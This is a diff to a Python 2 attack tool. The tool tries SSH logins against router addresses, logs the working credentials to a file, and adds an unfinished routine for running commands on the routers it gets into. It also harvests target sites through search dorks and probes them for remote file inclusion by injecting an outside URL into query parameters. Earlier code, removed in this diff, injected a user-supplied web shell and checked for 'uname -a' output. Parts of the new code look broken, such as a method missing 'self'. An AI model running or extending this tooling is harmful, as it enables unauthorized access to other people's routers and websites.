@@ -48,6 +48,7 @@ class Router(threading.Thread):
         self.queue = queue 
         self.user = user
         self.passw = passw
+        self.routers = []
  
     def run(self):
         """Tries to connect to given Ip on port 22"""
@@ -62,15 +63,37 @@ class Router(threading.Thread):
             try:
                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)
                 ssh.close()
+            except:
+                print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.passw)
+            else:
                 print "Working: %s:22 - %s:%s\n" % (ip_add, self.user, self.passw)
                 write = open('Routers.txt', "a+")
                 write.write('%s:22 %s:%s\n' % (ip_add, self.user, self.passw))
                 write.close()  
+                self.routers.append(ip_add)
+            finally:
                 self.queue.task_done()
+            if len(self.routers) > 0:
+                self.command()
 
-            except:
-                print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.passw)
-                self.queue.task_done()
+    def command():
+        """Allows user to run commands on chosen router"""
+        num = 0
+        for addr in self.routers:
+            print "[%s] %s " % (num, addr)
+        again = 'y'
+        while again == 'y':
+            choose = raw_input('Press number to attempt command execution(q to quit):')
+            if choose != 'q':
+                chosen = self.routers[int(choose)]
+                print 'Connecting to %s' % (chosen)
+                try:
+                    ssh.connect(chosen, username = self.user, password = self.passw, timeout = 10)
+                except:
+                    print 'Problem connecting'
+                else:
+                    """paramiko send command when figured out"""
+
                 
             
 class Ip:
@@ -112,8 +135,6 @@ class Ip:
 class Crawl:
     """Searches for dorks and grabs results"""
     def __init__(self):
-        if option == '4':
-            self.shell = str(raw_input('Shell location: '))
         self.dork = raw_input('Enter your dork: ')
         self.queue = Queue.Queue()
         self.pages = raw_input('How many pages(Max 20): ')
@@ -168,7 +189,7 @@ class Crawl:
 
         elif option == '4':
             for i in range(10):
-                thread = RScanClass(self.queue, self.shell)
+                thread = RScanClass(self.queue)
                 thread.setDaemon(True)
                 thread.start() 
             self.queue.join()
@@ -361,11 +382,10 @@ class XScanClass(threading.Thread):
 
 class RScanClass(threading.Thread):
     """Scans for Rfi errors and outputs to file"""
-    def __init__(self, queue, shell):
+    def __init__(self, queue):
         threading.Thread.__init__(self)
         self.queue = queue
         self.file = 'Rfi.txt'
-        self.shell = shell
  
     def run(self):
         """Checks Url for Remote File Inclusion vulnerability"""
@@ -381,7 +401,7 @@ class RScanClass(threading.Thread):
                 rsite = site.rsplit('=', 1)[0]
                 if rsite[-1] != "=":
                     rsite = rsite + "="
-                link = rsite + self.shell + '?'
+                link = rsite + 'http://google.com' + '?'
                 try:
                     conn = urllib2.Request(link)
                     conn.add_header('User-Agent', choice(USER_AGENT))
@@ -390,7 +410,7 @@ class RScanClass(threading.Thread):
                 except:
                     self.queue.task_done()
                 else:
-                    if (re.findall('uname -a', data, re.I)): #Or change to whatever is going to be in your shell for sure.
+                    if (re.findall("""<meta content="Search the world's information, including webpages, images, videos and more.""", data, re.I)): 
                         self.rfi(link)
                         vuln += 1
                     else:
